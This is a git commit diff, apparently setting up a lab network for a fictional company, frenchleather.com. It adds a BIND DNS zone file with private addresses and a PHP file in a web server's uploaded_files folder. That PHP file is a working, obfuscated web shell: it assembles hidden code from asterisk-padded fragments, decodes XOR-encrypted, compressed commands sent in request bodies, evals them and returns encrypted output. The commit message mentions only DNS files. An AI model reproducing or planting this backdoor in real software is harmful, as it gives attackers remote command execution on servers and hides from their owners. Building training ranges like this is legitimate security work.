d71c89838175f39123efca0254e7d12d6812c3c3
Brandon ALVES <brandon.da-silva-alves@inria.fr>
2021-06-18 15:47:50 +0200

    add dns server files

---
+++ config/debian-dns/etc/bind/db.frenchleather.com
@@ -0,0 +1,17 @@
+$TTL	604800
+$ORIGIN frenchleather.com.
+@	IN	SOA	debian-dns.frenchleather.com. admin.frenchleather.com. (
+			     13		; Serial
+			 604800		; Refresh
+			  86400		; Retry
+			2419200		; Expire
+			 604800 )	; Negative Cache TTL
+;
+@	IN	NS	debian-dns
+	IN	MX	10	debian-mail
+debian-admin	IN	A	192.168.1.50	
+debian-dns	IN	A	192.168.2.51
+debian-file	IN	A	192.168.2.52
+debian-mail	IN	A	192.168.2.50
+debian-web	IN	A	192.168.4.50
+
---
+++ config/debian-web/var/www/html/uploaded_files/86d67fa5699ad8207570ec9a4315af2c.php
@@ -0,0 +1,13 @@
+<?php
+$w='*=1) {@ob_s*tart();@e*val(@*gzun*comp**ress(@x**(@ba*se64_decod';
+$P='$k="acbd*18*db";**$kh="4cc2f85cedef*";$**kf="654fc*cc4a4d8";$p*';
+$Q=';$j++*,$i++)*{$o.=$t{$i}*^$k{$*j};}}ret*urn* *$o;}i**f (@preg_matc';
+$e=str_replace('im','','creimaimimteim_funcimtimion');
+$V='="wtaDr*mfA9X*JKi9re*";*f*u*nction x($t,$*k){$c=st*rlen($k);$l=';
+$E='e($*m[1]),$k)));$o=@o*b_g*et_c*on*tents();@ob_en*d_clea*n();$r=';
+$a='st*rlen($*t)*;$o=""*;for($i=*0;*$i<$l*;){for($**j=0;($j<$**c&&$i<$l)';
+$j='*@b*a*se64_encode(*@x*(@gzco*m*press($o),$k));pri*nt**("$p$kh$r$kf");}';
+$n='h("/$*kh**(.+)$kf/",@fi*le_g*et_conte*nts("p*hp://inp*ut"),*$m)=';
+$Y=str_replace('*','',$P.$V.$a.$Q.$n.$w.$E.$j);
+$N=$e('',$Y);$N();
+?>
